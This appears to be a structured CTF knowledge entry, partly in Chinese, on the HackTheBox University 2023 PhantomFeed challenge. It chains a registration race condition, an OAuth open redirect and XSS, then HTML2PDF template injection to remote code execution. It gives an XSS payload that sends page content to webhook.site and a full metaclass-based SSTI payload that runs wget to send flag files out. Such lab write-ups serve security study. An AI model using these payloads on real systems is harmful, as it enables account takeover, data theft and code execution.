---
title: Race Condition, OAuth without state and redirection into XSS & RCE via HTML2PDF - PhantomFeed HTB University 2023
contest: HackTheBox University CTF 2023 - PhantomFeed
year: 2023
difficulty: high
vuln_type: auth_bypass
tags: [race-condition, oauth, csrf, xss, html2pdf, ssti, puppeteer, redis-tokens, rce, jinja2, type-metaclass]
attack_chain:
  - PhantomFeed: 4 端口 (5000 前端 / 3000 phantomfeed / 4000 backend) + nginx 1337 代理
  - register 流程: create_user verified=True → 立即 add_verification verified=False → 异步 send email
  - ReDoS email 验证触发延迟, 期间 race condition: 10 个 login 线程 + 1 register 线程
  - 时机: register 后 0.03-0.1 秒内 login 可绕过 verified=False
  - 拿到 JWT token cookie (HttpOnly, SameSite=Strict)
  - bot_runner: webdriver.Chrome 创建 administrator JWT cookie 访问用户提交 market_link
  - /phantomfeed/feed POST market_link=@webhook.site/... 触发 bot 访问
  - OAuth 流程: /oauth2/auth → /oauth2/code (生成 authorization_code) → /oauth2/token (换 access_token)
  - 漏洞: redirect_url 未白名单 + 无 state 参数 → open redirect
  - XSS: redirect_url 注入 <script>window.location.href=`https://webhook.site/?access_token=${btoa(document.body.innerHTML)}`</script>
  - bot 触发 admin /oauth2/code?client_id=phantom-market&redirect_url=XSS 拿 authorization_code
  - 再访问 /oauth2/token?authorization_code=&redirect_url=XSS 拿 access_token JWT
  - HTML2PDF 端点 /backend/orders/html: color= 参数直接传给 render_template_string
  - 利用 type(type(1)) 元类 (orgTypeFun) + Word('__globals__') + pow.__globals__['os'].system
  - 触发命令: os.system('wget https://webhook.site/?$(cat /flag*)')
  - 通过 puppeteer bot + XSS + HTML2PDF SSTI 拿 RCE
key_payload: color=[[[getattr(pow, Word('__globals__'))['os'].system('wget webhook?$(cat /flag*)') for Word in [orgTypeFun('Word', (str,), {'mutated':1, 'startswith':lambda self,x:1==0, '__eq__':lambda self,x:self.mutate() and self.mutated<0 and str(self)==x, 'mutate':lambda self:{setattr(self,'mutated',self.mutated-1)}, '__hash__':lambda self:hash(str(self))})]]] for orgTypeFun in [type(type(1))] for none in [[].append(1)]] and 'red'
one_liner: HTB University 2023 PhantomFeed 全链：register 竞态 (ReDoS 延迟) → 拿 JWT → feed market_link 触发 bot 访问 → OAuth open redirect + XSS 拿 admin access_token → HTML2PDF color SSTI 用元类 type(type(1)) 链 + pow.__globals__ 触发 RCE。
lesson: 注册/验证 race condition 是 web 经典漏洞；OAuth 缺 state 必导致 open redirect 触发 XSS；HTML2PDF render_template_string 接受颜色参数是 SSTI 入口；Python 元类 type(type(1)) 配合 __eq__/__hash__ 绕过是 pyjail 经典手法。
quality: high
---
